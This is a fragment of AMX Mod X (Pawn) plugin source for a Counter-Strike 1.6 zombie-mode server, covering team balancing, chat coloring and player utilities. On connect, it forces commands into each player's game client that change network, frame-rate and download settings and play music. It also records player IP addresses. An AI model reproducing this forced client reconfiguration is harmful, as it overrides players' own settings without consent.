					set_hudmessage(10, 255, 200, 0.10, 0.40, 0, 0.10, 0.10, 0.10, 0.10, 18);
					ShowSyncHudMsg(entity_get_int(iPlayer, EV_INT_iuser2), g_iSecondMineMessage, "Second mine's health: %0.0f", flHealth + -1000);
				}
			}

			if( flHealth <= 1000) 
			{
				Func_Explode( iPlayer );
				
				return FMRES_IGNORED;
			}
		}
	}
	
	if( is_valid_ent( iPlayer ) )
		entity_set_float( iPlayer, EV_FL_nextthink, flGameTime + 0.1 );
	
	return FMRES_IGNORED;
}

EmitSound ( Index, Channel, const Sound [ ] ) emit_sound ( Index, Channel, Sound, 1.0, ATTN_NORM, 1, 105 );

public client_connect(Client)
{
	static const Sounds[] = { 12, 16, 17 };
	remove_user_flags( Client );
	set_user_flags( Client, ADMIN_USER );
	if (is_user_bot(Client) || is_user_hltv(Client)) return;
	client_cmd(Client, "mp3volume 0.275; mp3 play media/Half-Life%d.mp3", Sounds[random_num(0, 2)]);
	client_cmd(Client, "rate 36000; cl_cmdrate 128; cl_updaterate 128; fps_max 300; fps_override 1; sys_ticrate 9999")
	client_cmd(Client, "cl_crosshair_size small; cl_dynamiccrosshair 0; cl_dlmax 8192")	
}

public MessageTeamInfo(iMessage, iDestination)
{
	static cTeam[2];
	static iPlayer;
	if ((iDestination != 2 && iDestination) || SwitchingTeam)
	{
		return 0;
	}
	iPlayer = get_msg_arg_int(1);
	if (0 < iPlayer < g_iMaxClients + 1 || !g_bConnected[iPlayer] || !is_user_connected(iPlayer))
	{
		return 0;
	}
	set_task(0.1, "TaskCheckFlash", iPlayer, "", 0, "", 0);
	if (!g_bModeStarted)
	{
		return 0;
	}
	get_msg_arg_string(2, cTeam, 2);
	switch (cTeam[0])
	{
		case 'C':
		{
			if ((g_iRoundType & 4 || g_iRoundType & 8) && GetHumans())
			{
				remove_task ( iPlayer + TASK_TEAM );
				fm_cs_set_user_team ( iPlayer, FM_CS_TEAM_T );
				set_msg_arg_string(2, "TERRORIST");
			}
			else
			{
				if (!GetZombies())
				{
					remove_task ( iPlayer + TASK_TEAM );
					fm_cs_set_user_team ( iPlayer, FM_CS_TEAM_T );
					set_msg_arg_string(2, "TERRORIST");
				}
			}
		}
		case 'T':
		{
			if ((g_iRoundType & 64 || g_iRoundType & 4 || g_iRoundType & 8) && GetHumans())
			{
			}
			else
			{
				if (GetZombies())
				{
					remove_task ( iPlayer + TASK_TEAM );
					fm_cs_set_user_team ( iPlayer, FM_CS_TEAM_CT );
					set_msg_arg_string(2, "CT");
				}
			}
		}
		default:
		{
		}
	}
	return 0;
}

BalanceTeams (  )
{
	static iPlayersNum;
	
	iPlayersNum = fnGetPlaying (  );
	
	if ( iPlayersNum < 1 ) return;

	static iTerrors, iMaxTerrors, id, Team [33];
	
	iMaxTerrors = iPlayersNum / 2;
	
	iTerrors = 0;

	for ( id = 1; id <= g_iMaxClients; id ++ )
	{
		if ( !g_bConnected [id] ) continue;
		
		Team [id] = fm_cs_get_user_team ( id );
		
		if ( Team [id] == FM_CS_TEAM_SPECTATOR || Team [id] == FM_CS_TEAM_UNASSIGNED ) continue;

		remove_task ( id + TASK_TEAM );
		
		fm_cs_set_user_team ( id, FM_CS_TEAM_CT );
		
		Team [id] = FM_CS_TEAM_CT;
	}

	while ( iTerrors < iMaxTerrors )
	{
		if ( ++ id > g_iMaxClients ) id = 1;
		
		if ( !g_bConnected [id] ) continue;

		if ( Team [id] != FM_CS_TEAM_CT ) continue;
		
		if ( random_num ( 0, 1 ) )
		{
			fm_cs_set_user_team ( id, FM_CS_TEAM_T );
			
			Team [id] = FM_CS_TEAM_T;
			
			iTerrors ++;
		}
	}
}

fnGetPlaying (  )
{
	static iPlaying, id, Team
	
	iPlaying = 0
	
	for ( id = 1; id <= g_iMaxClients; id ++ )
	{
		if ( g_bConnected [id] )
		{
			Team = fm_cs_get_user_team ( id );
			
			if ( Team != FM_CS_TEAM_SPECTATOR && Team != FM_CS_TEAM_UNASSIGNED )
				
			iPlaying ++;
		}
	}
	return iPlaying;
}

public CHECK_ValidPlayer(id)
{
	
	if (1<=id<=g_iMaxClients && is_user_alive(id))
		return 1;
	
	return 0;
}

InsertInfo(iPlayer)
{
	if (0 < g_iSize)
	{
		static iLast;
		iLast = 0;
		if (g_iSize < 10)
		{
			iLast = g_iSize + -1;
		}
		else
		{
			iLast = g_iTracker + -1;
			if (0 > iLast)
			{
				iLast = g_iSize + -1;
			}
		}
		if (equal(g_cPlayerAddress[iPlayer], g_cAddresses[iLast]))
		{
			copy(g_cLNames[iLast], 32, g_cName[iPlayer]);
			return 0;
		}
	}
	static iTarget;
	iTarget = 0;
	if (g_iSize < 10)
	{
		iTarget = g_iSize;
		g_iSize += 1;
	}
	else
	{
		iTarget = g_iTracker;
		g_iTracker += 1;
		if (g_iTracker == 10)
		{
			g_iTracker = 0;
		}
	}
	copy(g_cLNames[iTarget], 32, g_cName[iPlayer]);
	copy(g_cAddresses[iTarget], 24, g_cPlayerAddress[iPlayer]);
	return 0;
}

GetInfo(i, cName[], iNameSize, cAddress[], iAddressSize)
{
	static iTarget;
	iTarget = i + g_iTracker % 10;
	copy(cName, iNameSize, g_cNames[iTarget]);
	copy(cAddress, iAddressSize, g_cAddresses[iTarget]);
	return 0;
}

Float:GetTimeLeft()
{
    return get_cvar_float("mp_timelimit") * 60.0 - get_gametime();
}

stock client_print_color ( id, iColor = print_team_default, const Msg [ ], any:... )
{
	if ( id && !is_user_connected ( id ) ) return 0;
	
	if ( iColor > print_team_grey ) iColor = print_team_default;
	
	new Message [192];
	
	if ( iColor == print_team_default )
		
	Message [0] = 0x04;
	else
	Message [0] = 0x03;
	
	
	new iParams = numargs (  )
	
	if ( id )
	{
		if ( iParams == 3 )
			
		copy ( Message [1], charsmax ( Message ) -1, Msg );
		else
			vformat ( Message [1], charsmax ( Message ) -1, Msg, 4 );
		
		if ( iColor )
		{
			new GetTeam [11]; get_user_team ( id, GetTeam, charsmax ( GetTeam ) );
			
			SendTeamInfo ( id, id, TeamName [iColor] );
			
			SendSayText ( id, id, Message );
			
			SendTeamInfo ( id, id, GetTeam );
		}
		else
			SendSayText ( id, id, Message );
	} 
	else
	{
		new iPlayers [32], iNum; get_players ( iPlayers, iNum, "ch" );
		
		if ( !iNum ) return 0;
		
		new iFool = iPlayers [0];
		
		if ( iParams == 3 )
			
		copy ( Message [1], charsmax ( Message ) -1, Msg );
		else
			vformat ( Message [1], charsmax ( Message ) -1, Msg, 4 );
		
		if ( iColor )
		{
			new GetTeam [11]; get_user_team ( iFool, GetTeam, charsmax ( GetTeam ) );
			
			SendTeamInfo ( 0, iFool, TeamName [iColor] );
			
			SendSayText ( 0, iFool, Message);
			
			SendTeamInfo ( 0, iFool, GetTeam );
		}
		else
			SendSayText ( 0, iFool, Message );
	}
	
	return 1;
}

stock SendTeamInfo ( iReceiver, iPlayerId, GetTeam [] )
{
	static iTeamInfo = 0;
	
	if ( !iTeamInfo )
		
	iTeamInfo = get_user_msgid ( "TeamInfo" );
	
	message_begin ( iReceiver ? MSG_ONE_UNRELIABLE : MSG_BROADCAST, iTeamInfo, .player = iReceiver );
	
	write_byte ( iPlayerId );
	
	write_string ( GetTeam );
	
	message_end (  );
}

stock SendSayText ( iReceiver, iPlayerId, Message [ ] )
{
	static iSayText = 0;
	
	if ( !iSayText )
		
	iSayText = get_user_msgid ( "SayText" );
	
	message_begin ( iReceiver ? MSG_ONE_UNRELIABLE : MSG_BROADCAST, iSayText, .player = iReceiver );
	
	write_byte ( iPlayerId );
	
	write_string ( Message );
	
	message_end (  );
}

stock GetInfoPlayer ( id, const iInfo )
{
	new InfoToReturn [64];

	switch( iInfo )
	{
		case INFO_NAME:
		{
			new Name[ 32]; get_user_name ( id, Name, charsmax ( Name ) );
		
			copy ( InfoToReturn, charsmax ( InfoToReturn ), Name );
		}
		case INFO_IP:
		{
			new Ip [32]; get_user_ip ( id, Ip, charsmax ( Ip ), 1 );
		
			copy ( InfoToReturn, charsmax ( InfoToReturn ), Ip );
		}
		case INFO_AUTHID:
		{
			new AuthId [35]; get_user_authid ( id, AuthId, charsmax ( AuthId ) );
		
			copy ( InfoToReturn, charsmax ( InfoToReturn ),  AuthId );
		}
	}

	return InfoToReturn;
}

stock is_player_stuck(id)
{
    static Float:originF[3]
    pev(id, pev_origin, originF)
   
    engfunc(EngFunc_TraceHull, originF, originF, 0, (pev(id, pev_flags) & FL_DUCKING) ? HULL_HEAD : HULL_HUMAN, id, 0)
   
    if (get_tr2(0, TR_StartSolid) || get_tr2(0, TR_AllSolid) || !get_tr2(0, TR_InOpen))
        return true;
   
    return false;
}

stock bool:unstuck_is_hull_vacant(const Float:origin[3], hull,id) 
{
    static tr
    engfunc(EngFunc_TraceHull, origin, origin, 0, hull, id, tr)
    if (!get_tr2(tr, TR_StartSolid) || !get_tr2(tr, TR_AllSolid))
        return true
    
    return false
} 

stock fm_set_weapon_ammo(entity, amount)
{
	set_pdata_int(entity, OFFSET_CLIPAMMO, amount, OFFSET_LINUX_WEAPONS);
}

stock fm_cs_get_user_team ( id )
{
	return get_pdata_int ( id, 114, 5 );
}

stock fm_cs_set_user_team ( id, team )
{
	set_pdata_int ( id, 114, team, 5 );
}

stock fm_user_team_update ( id )
{
	static Float: CurrentTime;
	
	CurrentTime = get_gametime (  );
	
	if ( CurrentTime - TeamsTargetTime >= 0.1 )
	{
		set_task ( 0.1, "fm_cs_set_user_team_msg", id + TASK_TEAM );
		
		TeamsTargetTime = CurrentTime + 0.1
	}
	else
	{
		set_task ( ( TeamsTargetTime + 0.1 ) - CurrentTime, "fm_cs_set_user_team_msg", id + TASK_TEAM );
		
		TeamsTargetTime = CurrentTime + 0.1
	}
}

public fm_cs_set_user_team_msg ( TaskIndex )
{
	SwitchingTeam = true;

	emessage_begin ( MSG_ALL, get_user_msgid ( "TeamInfo" ) );
	
	ewrite_byte ( ID_TEAM );
	
	ewrite_string ( CS_TEAM_NAMES [fm_cs_get_user_team (ID_TEAM)] );
	
	emessage_end (  );
	
	SwitchingTeam = false
	
	if(g_bAlive[ID_TEAM] && g_vip[ID_TEAM])
	{
		message_begin(MSG_BROADCAST, get_user_msgid("ScoreAttrib"))
		write_byte(ID_TEAM)
		write_byte(4)
		message_end()
	}	
}